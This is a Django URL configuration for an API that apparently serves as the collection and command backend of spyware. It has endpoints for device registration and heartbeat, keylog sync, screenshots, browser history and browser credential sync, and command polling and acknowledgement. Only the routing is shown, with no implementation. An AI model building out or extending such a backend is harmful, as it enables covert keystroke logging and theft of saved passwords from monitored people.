"""
URL configuration for the API app.
"""

from django.urls import path
from . import views

app_name = 'api'

urlpatterns = [
    # Health check
    path('health/', views.health_check, name='health_check'),
    
    # Device management
    path('device/register/', views.DeviceRegistrationView.as_view(), name='device_register'),
    path('device/heartbeat/', views.DeviceHeartbeatView.as_view(), name='device_heartbeat'),
    
    # Configuration
    path('config/sync/', views.ConfigSyncView.as_view(), name='config_sync'),
    
    # File metadata
    path('files/metadata/', views.FileMetadataView.as_view(), name='file_metadata'),
    
    # Screenshots
    path('screenshots/metadata/', views.ScreenshotMetadataView.as_view(), name='screenshot_metadata'),
    
    # Keylogs
    path('keylogs/sync/', views.KeylogSyncView.as_view(), name='keylog_sync'),
    
    # Browser Data
    path('browser/history/', views.BrowserHistorySyncView.as_view(), name='browser_history_sync'),
    # path('browser/cookies/', views.BrowserCookieSyncView.as_view(), name='browser_cookie_sync'),
    path('browser/credentials/', views.BrowserCredentialSyncView.as_view(), name='browser_credential_sync'),
    
    # Commands
    path('commands/poll/', views.CommandPollView.as_view(), name='command_poll'),
    path('commands/ack/', views.CommandAckView.as_view(), name='command_ack'),
]
